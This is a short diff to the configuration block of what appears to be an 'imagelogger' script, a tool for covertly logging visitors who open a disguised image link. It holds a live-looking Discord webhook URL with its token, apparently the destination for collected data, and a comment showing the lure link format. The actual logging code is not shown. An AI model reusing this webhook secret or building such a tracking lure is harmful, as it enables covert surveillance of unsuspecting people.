@@ -14,7 +14,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1373768676414591047/nCXyFD8ifd_sYgnPwls122GJEUlmYNGglVvQgAUXBlTRODorzl7WyuECANJnZW88EIfj",
-    "image": "juice.png.", # You can also have a custom image by using a URL argument
+    "image": "https://de.images.search.yahoo.com/images/view;_ylt=AwrihDgiYypocq0rkBo1CQx.;_ylu=c2VjA3NyBHNsawNpbWcEb2lkAzc2YTI4NjJhNjg5YTEzYzNlMjQ0OGMwMThjZTI5YmZjBGdwb3MDNARpdANiaW5n?back=https%3A%2F%2Fde.images.search.yahoo.com%2Fsearch%2Fimages%3Fp%3Dbillss%26ei%3DUTF-8%26type%3DE210DE91082G0%26fr%3Dmcafee%26fr2%3Dp%253As%252Cv%253Ai%252Cm%253Asb-top%26tab%3Dorganic%26ri%3D4&w=1200&h=787&imgurl=pnghq.com%2Fwp-content%2Fuploads%2Fpnghq.com-buffalo-bills-logo-png-al-7.png&rurl=https%3A%2F%2Fpnghq.com%2Fbuffalo-bills-logo-png-alpha-channel%2F&size=297KB&p=billss&oid=76a2862a689a13c3e2448c018ce29bfc&fr2=p%3As%2Cv%3Ai%2Cm%3Asb-top&fr=mcafee&tt=Buffalo+Bills+Logo+Png+Alpha+Channel&b=0&ni=150&no=4&ts=&tab=organic&sigr=3v78dB1jJYZW&sigb=gr3dSwbm525n&sigi=qgNxDk5keS0c&sigt=reaQ9PQ2ORoc&.crumb=T1hJhsHcYvS&fr=mcafee&fr2=p%3As%2Cv%3Ai%2Cm%3Asb-top&type=E210DE91082G0.", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
